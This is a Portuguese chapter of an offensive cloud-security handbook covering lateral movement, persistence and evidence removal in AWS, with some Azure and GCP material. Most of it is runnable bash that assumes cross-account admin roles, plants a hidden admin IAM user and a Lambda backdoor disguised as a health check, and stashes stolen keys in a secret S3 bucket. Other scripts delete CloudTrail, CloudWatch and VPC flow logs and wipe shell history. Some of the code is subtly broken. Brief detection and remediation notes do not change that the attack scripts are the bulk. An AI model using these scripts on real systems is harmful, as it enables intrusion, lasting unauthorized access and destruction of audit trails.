# 5. Lateral Movement - Movimentação Entre Recursos/Contas/Regiões

Técnicas para acessar outros recursos, contas e regiões após ganhar foothold inicial.

---

## 5.1 AWS CROSS-ACCOUNT LATERAL MOVEMENT

### 🎯 Vulnerabilidade
```
Tipo: Trust Relationship Abuse
CVSS: 9.8
Cenário: Conta A pode assumir role em Conta B
Impacto: Accesso a múltiplas contas da organização
```

### 📋 EXPLORAÇÃO PASSO-A-PASSO

#### FASE 1: DESCOBRIR TRUST RELATIONSHIPS

```bash
#!/bin/bash
# Script: aws-trust-enum.sh

CURRENT_ACCOUNT=$(aws sts get-caller-identity --query Account --output text)

echo "[*] Fase 1: Enumerar Trust Relationships"
echo "[*] Conta Atual: $CURRENT_ACCOUNT"

# Listar todas as roles na conta atual
echo "[?] Listando roles da conta..."
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Para cada role, verificar AssumeRolePolicyDocument
aws iam list-roles --query 'Roles[*].RoleName' --output text | while read role; do
  POLICY=$(aws iam get-role --role-name "$role" --query 'Role.AssumeRolePolicyDocument' --output json)
  
  # Procurar por contas externas
  EXTERNAL_ACCOUNTS=$(echo "$POLICY" | grep -o '"AWS":"arn:aws:iam::[0-9]*' | grep -o '[0-9]*' | sort -u)
  
  if [ ! -z "$EXTERNAL_ACCOUNTS" ]; then
    echo "[!] Role $role confia em:"
    echo "$EXTERNAL_ACCOUNTS" | while read account; do
      if [ "$account" != "$CURRENT_ACCOUNT" ]; then
        echo "    [+] Conta: $account"
      fi
    done
  fi
done
```

#### FASE 2: ASSUMIR ROLE EM OUTRA CONTA

```bash
#!/bin/bash
# Script: aws-cross-account-assume.sh

TARGET_ACCOUNT="123456789012"
TARGET_ROLE="AdminRole"

echo "[*] Fase 2: Assumir Role em Outra Conta"
echo "[*] Alvo: arn:aws:iam::$TARGET_ACCOUNT:role/$TARGET_ROLE"

# Assumir role
CREDS=$(aws sts assume-role \
  --role-arn "arn:aws:iam::$TARGET_ACCOUNT:role/$TARGET_ROLE" \
  --role-session-name "exploitation-session-$(date +%s)" \
  --output json)

if echo "$CREDS" | jq -e '.Credentials' > /dev/null; then
  echo "[+] Role assumida com sucesso!"
  
  # Extrair credenciais
  ACCESS_KEY=$(echo "$CREDS" | jq -r '.Credentials.AccessKeyId')
  SECRET_KEY=$(echo "$CREDS" | jq -r '.Credentials.SecretAccessKey')
  SESSION_TOKEN=$(echo "$CREDS" | jq -r '.Credentials.SessionToken')
  
  # Ativar credenciais
  export AWS_ACCESS_KEY_ID="$ACCESS_KEY"
  export AWS_SECRET_ACCESS_KEY="$SECRET_KEY"
  export AWS_SESSION_TOKEN="$SESSION_TOKEN"
  
  echo "[+] Credenciais ativadas"
  echo "[?] Verificando nova identidade..."
  aws sts get-caller-identity
  
  # Agora você está na conta de alvo!
  echo "[?] Explorando recursos da conta alvo..."
  aws s3 ls
  aws ec2 describe-instances --region us-east-1 | jq '.Reservations[0].Instances[0]'
else
  echo "[-] Falha ao assumir role"
fi
```

---

## 5.2 AWS CROSS-REGION LATERAL MOVEMENT

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: aws-cross-region.sh

echo "[*] Descobrir recursos em todas as regiões"

# Listar todas as regiões
REGIONS=$(aws ec2 describe-regions --query 'Regions[*].RegionName' --output text)

echo "[?] Procurando recursos sensíveis em $REGIONS"

for region in $REGIONS; do
  echo "[*] Região: $region"
  
  # Procurar S3 buckets (global, mas listar uma vez)
  if [ "$region" = "us-east-1" ]; then
    BUCKETS=$(aws s3 ls | awk '{print $3}')
    echo "[+] S3 Buckets encontrados: $(echo $BUCKETS | wc -w)"
  fi
  
  # EC2 instances
  INSTANCES=$(aws ec2 describe-instances --region $region --query 'Reservations[*].Instances[*].InstanceId' --output text)
  if [ ! -z "$INSTANCES" ]; then
    echo "[+] EC2 em $region: $INSTANCES"
  fi
  
  # RDS databases
  DATABASES=$(aws rds describe-db-instances --region $region --query 'DBInstances[*].DBInstanceIdentifier' --output text 2>/dev/null)
  if [ ! -z "$DATABASES" ]; then
    echo "[+] RDS em $region: $DATABASES"
  fi
done
```

---

## 5.3 AZURE CROSS-SUBSCRIPTION LATERAL MOVEMENT

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: azure-cross-subscription.sh

echo "[*] Enumerando subscriptions acessíveis"

# Listar subscriptions
SUBSCRIPTIONS=$(az account list --query '[*].[id, name]' --output text)

echo "[+] Subscriptions acessíveis:"
echo "$SUBSCRIPTIONS" | while read sub_id sub_name; do
  echo "    [$sub_id] $sub_name"
done

# Para cada subscription, explorar
for sub_id in $(az account list --query '[*].id' --output text); do
  echo "[*] Explorando subscription: $sub_id"
  
  # Mudar subscription
  az account set --subscription $sub_id
  
  # Listar recursos
  RESOURCES=$(az resource list --query '[*].[name, type]' --output text | head -5)
  echo "[+] Recursos encontrados:"
  echo "$RESOURCES"
  
  # Procurar Key Vaults
  VAULTS=$(az keyvault list --query '[*].name' --output text)
  if [ ! -z "$VAULTS" ]; then
    echo "[!] Key Vaults encontrados:"
    for vault in $VAULTS; do
      SECRETS=$(az keyvault secret list --vault-name $vault --query '[*].name' --output text 2>/dev/null)
      echo "    [$vault] Secrets: $(echo $SECRETS | wc -w)"
    done
  fi
done
```

---

## 5.4 GCP CROSS-PROJECT LATERAL MOVEMENT

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: gcp-cross-project.sh

echo "[*] Enumerando projetos acessíveis"

# Listar projetos (requererá permissão)
PROJECTS=$(gcloud projects list --query '[*].[projectId, name]' --format='table')

echo "[+] Projetos acessíveis:"
echo "$PROJECTS"

# Para cada projeto, explorar
for project in $(gcloud projects list --query '[*].projectId' --output text); do
  echo "[*] Explorando projeto: $project"
  
  # Mudar projeto
  gcloud config set project $project
  
  # Listar service accounts
  SAs=$(gcloud iam service-accounts list --query '[*].email' --output text)
  echo "[+] Service Accounts:"
  echo "$SAs" | head -3
  
  # Listar buckets do projeto
  BUCKETS=$(gsutil ls -p $project 2>/dev/null)
  if [ ! -z "$BUCKETS" ]; then
    echo "[+] Cloud Storage buckets:"
    echo "$BUCKETS" | head -3
  fi
  
  # Listar VMs
  VMs=$(gcloud compute instances list --project=$project --format='value(name)' 2>/dev/null)
  if [ ! -z "$VMs" ]; then
    echo "[+] Compute instances:"
    echo "$VMs" | head -3
  fi
done
```

---

## 📝 CASE STUDY: Organização Multi-Conta

**CENÁRIO:**
```
AWS Organization com 15 contas
- Conta Raiz (segura, não explorável)
- 5 contas de Produção (críticas)
- 7 contas de Dev/Test (menos seguras)
- 2 contas de Fornecedores (externas)

Você conseguiu acesso em: conta-dev-01
```

**LATERAL MOVEMENT TIMELINE:**

| Tempo | Ação | Resultado |
|---|---|---|
| 00:00-00:15 | Enumerar trust relationships | ✅ 8 contas confiáveis encontradas |
| 00:15-00:30 | Assumir role em conta-test-01 | ✅ Acesso conseguido |
| 00:30-01:00 | Enumerar teste e procurar chaves | ✅ Chave de conta-prod-01 encontrada! |
| 01:00-01:20 | Assumir role em conta-prod-01 | ✅ Acesso a produção! |
| 01:20-02:00 | Exfiltrar dados sensíveis | ✅ 500K registros |

**IMPACTO:**
```
Acesso Inicial: Dev account (baixa severidade)
Acesso Final: Production (CRÍTICO)
Caminho: dev → test → prod (3 passos)
Tempo Total: 2 horas
Dados Expostos: 500K registros de produção
```

---

## 🛑 DETECÇÃO & MITIGAÇÃO

**CloudTrail Indicators:**
```json
{
  "eventName": "AssumeRole",
  "sourceIPAddress": "203.0.113.42",
  "requestParameters": {
    "roleArn": "arn:aws:iam::TARGET_ACCOUNT:role/AdminRole"
  }
}
```

**REMEDIAÇÃO:**
```bash
# 1. Revisar todas as trust relationships
aws iam list-roles --query 'Roles[*].RoleName' | \
  xargs -I {} aws iam get-role --role-name {} | \
  grep -A5 '"AWS"'

# 2. Remover contas que não deveriam ter acesso
aws iam update-assume-role-policy-document \
  --role-name AdminRole \
  --policy-document file://trusted-accounts-only.json

# 3. Implementar SCP (Service Control Policy)
# Negar assume-role cross-account
```

---

## 6. Persistence - Criar Backdoors Permanentes

### 🎯 Vulnerabilidade
```
Tipo: Persistence Mechanism
CVSS: 8.8 (permite continuar após detecção)
Objetivo: Manter acesso mesmo após credenciais primárias serem revogadas
```

### 📋 TÉCNICAS AWS

```bash
#!/bin/bash
# Script: aws-persistence-backdoor.sh

echo "[*] Criando backdoors permanentes"

# Método 1: Usuário IAM Secreto
echo "[1] Criando usuário IAM secreto..."
BACKDOOR_USER="svc-monitoring-backup-$(date +%s | tail -c 5)"
aws iam create-user --user-name "$BACKDOOR_USER"

# Criar access key
KEYS=$(aws iam create-access-key --user-name "$BACKDOOR_USER" --output json)
ACCESS_KEY=$(echo "$KEYS" | jq -r '.AccessKey.AccessKeyId')
SECRET_KEY=$(echo "$KEYS" | jq -r '.AccessKey.SecretAccessKey')

# Attach admin policy
aws iam attach-user-policy --user-name "$BACKDOOR_USER" \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "[+] Backdoor user criado: $BACKDOOR_USER"
echo "[+] Access Key: $ACCESS_KEY"
echo "[+] Secret Key: $SECRET_KEY"
echo "[+] Credenciais salvas (copie-as)!"

# Método 2: Lambda Function com Scheduled Trigger
echo "[2] Criando Lambda backdoor..."

cat > lambda_backdoor.py << 'EOF'
import boto3
import json

def lambda_handler(event, context):
    # A cada execução, criar um novo usuário admin
    iam = boto3.client('iam')
    
    timestamp = str(int(time.time()))
    username = f"svc-admin-{timestamp}"
    
    try:
        iam.create_user(UserName=username)
        iam.attach_user_policy(
            UserName=username,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        
        # Retornar credenciais para atacante
        return {
            'statusCode': 200,
            'body': json.dumps({
                'username': username,
                'created': True
            })
        }
    except:
        pass
EOF

# Deploy Lambda
zip lambda_backdoor.zip lambda_backdoor.py
aws lambda create-function --function-name system-health-check \
  --runtime python3.9 \
  --role arn:aws:iam::ACCOUNT:role/lambda-execution-role \
  --handler lambda_backdoor.lambda_handler \
  --zip-file fileb://lambda_backdoor.zip

# Agendar execução
aws events put-rule --name daily-health-check \
  --schedule-expression "cron(0 2 * * ? *)"

echo "[+] Lambda backdoor criado!"

# Método 3: S3 Bucket + SDK Malicioso
echo "[3] Criando S3 persistence..."

# Criar bucket secreto para armazenar credenciais
BUCKET="sec-backup-$(date +%s | tail -c 5)"
aws s3api create-bucket --bucket $BUCKET

# Upload de chaves para uso futuro
echo "$ACCESS_KEY:$SECRET_KEY" | aws s3 cp - "s3://$BUCKET/backup-keys.txt"

echo "[+] Credenciais armazenadas em: s3://$BUCKET/backup-keys.txt"
```

---

## 7. Covering Tracks - Apagar Evidências

### 📋 EXPLORAÇÃO

```bash
#!/bin/bash
# Script: aws-cover-tracks.sh

echo "[*] Apagando evidências (NÃO FAZER EM PRODUÇÃO!)"

# 1. Apagar CloudTrail logs
echo "[1] Deletando CloudTrail logs..."

# Encontrar CloudTrail S3 bucket
CLOUDTRAIL_BUCKET=$(aws cloudtrail describe-trails --query 'trailList[0].S3BucketName' --output text)

if [ ! -z "$CLOUDTRAIL_BUCKET" ]; then
  # Deletar logs
  aws s3 rm "s3://$CLOUDTRAIL_BUCKET/AWSLogs/" --recursive
  
  # Deletar prefixo específico de data
  DATE=$(date +%Y/%m/%d)
  aws s3 rm "s3://$CLOUDTRAIL_BUCKET/AWSLogs/$DATE/" --recursive
fi

# 2. Apagar CloudWatch Logs
echo "[2] Deletando CloudWatch logs..."

# Encontrar log groups relacionados
LOG_GROUPS=$(aws logs describe-log-groups --query 'logGroups[*].logGroupName' --output text)

for group in $LOG_GROUPS; do
  # Procurar streams suspeitos
  STREAMS=$(aws logs describe-log-streams --log-group-name "$group" \
    --query 'logStreams[*].logStreamName' --output text 2>/dev/null)
  
  for stream in $STREAMS; do
    if echo "$stream" | grep -iE "lambda|api|access|auth" > /dev/null; then
      # Deletar stream
      aws logs delete-log-stream --log-group-name "$group" --log-stream-name "$stream" 2>/dev/null
    fi
  done
done

# 3. Apagar VPC Flow Logs
echo "[3] Deletando VPC Flow Logs..."

# Encontrar flow logs
FLOW_LOGS=$(aws ec2 describe-flow-logs --query 'FlowLogs[*].DeliverLogsStatus' --output text)

# Desabilitar
aws ec2 delete-flow-logs --flow-log-ids $(aws ec2 describe-flow-logs --query 'FlowLogs[*].FlowLogId' --output text)

# 4. Limpar histórico de comandos
echo "[4] Limpando histórico local..."

# Bash history
history -c
history -w

# Zsh history
rm -f ~/.zsh_history

# 5. Remover credenciais temporárias de /tmp
echo "[5] Limpando /tmp..."

rm -f /tmp/.aws* 2>/dev/null
rm -f /tmp/*key* 2>/dev/null
rm -f /tmp/*secret* 2>/dev/null
rm -f /tmp/*cred* 2>/dev/null

echo "[+] Cobertura de trilhos concluída!"
echo "[!] NOTA: Logs em S3 com versionamento podem ser recuperados"
```

---

## 📊 COMPARAÇÃO DE TÉCNICAS

| Técnica | Persistência | Detectabilidade | Remediação |
|---|---|---|---|
| Usuário IAM | Permanente | Média | Fácil (revoke keys) |
| Lambda Backdoor | Permanente | Média | Difícil (precisa achar) |
| S3 Credenciais | Permanente | Baixa | Difícil (precisa achar) |
| EC2 Cronjob | Permanente | Alta | Médio (procurar process) |
| CloudWatch Agent | Permanente | Média | Difícil (em toda VM) |

---

## 🛑 DETECÇÃO

**O QUE PROCURAR:**
- Novos usuários IAM criados
- Permissões adicionadas a funções Lambda
- Novos buckets S3 criados
- Mudanças em CloudWatch Logs
- Novos scheduled events/rules

**REMEDIAÇÃO:**
```bash
# Deletar usuário backdoor
aws iam delete-access-key --user-name $BACKDOOR_USER --access-key-id $KEY
aws iam detach-user-policy --user-name $BACKDOOR_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name $BACKDOOR_USER

# Deletar Lambda backdoor
aws lambda delete-function --function-name system-health-check

# Deletar S3 bucket com credenciais
aws s3 rb s3://$BUCKET --force
```

---

Esta é a estrutura para Lateral Movement, Persistence e Covering Tracks.

